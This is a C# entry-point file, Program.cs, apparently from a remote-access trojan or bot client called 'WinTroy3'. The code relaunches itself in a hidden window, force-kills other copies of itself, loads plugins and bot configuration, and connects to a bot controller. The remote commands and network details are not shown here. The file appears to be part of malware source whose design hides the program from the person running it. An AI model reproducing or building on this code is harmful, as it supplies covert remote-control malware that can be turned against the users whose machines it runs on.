using System.IO;
using WinTroy3_Client.Menu;
using static WinTroy3_Client.Bot;
using static WinTroy3_Client.Menu.Plugins;
using WinTroy3_PluginLib;
using static WinTroy3_PluginLib.Config.PathConfig;
using System.Diagnostics;
using Microsoft.Win32;
using System.Windows.Input;
using System.Runtime.InteropServices;
using System;

namespace WinTroy3_Client
{
    internal class Program
    {
        static void Ini()
        {
            string tempPath = GetTempPath();

            if (!Directory.Exists(tempPath))
            {
                Directory.CreateDirectory(tempPath);
            }

            Prot();
        }

        static void Prot()
        {
            var currentProcess = Process.GetCurrentProcess();
            var processes = Process.GetProcessesByName(currentProcess.ProcessName);

            foreach (var process in processes)
            {
                var id = process.Id;
                if (id != currentProcess.Id)
                {
                    var startInfo = new ProcessStartInfo()
                    {
                        FileName = "taskkill.exe",
                        Arguments = $"/pid {id} /f"
                    };
                    Process.Start(startInfo);
                }
            }
        }

        public static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = "i"
                };
                Process.Start(startInfo);
                Environment.Exit(0);
            }
            Ini();
            LoadMenus().GetAwaiter();
            Config.BotConfig.Init();
            try
            {
                ConnectBot();
            }
            catch (Exception ex)
            {
                Control.Log(ex, true);
            }
        }
    }
}
